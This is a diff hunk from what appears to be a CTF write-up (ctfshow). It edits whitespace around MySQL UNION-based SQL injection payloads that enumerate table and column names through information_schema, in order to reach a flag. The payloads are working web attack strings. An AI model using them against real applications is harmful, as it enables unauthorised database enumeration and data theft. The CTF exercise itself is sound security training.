@@ -4,7 +4,7 @@
 
 ```tex
 # 查数据库
-payload = "-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
+payload="-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
 # 查列名
 payload="-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"
 # 查flag
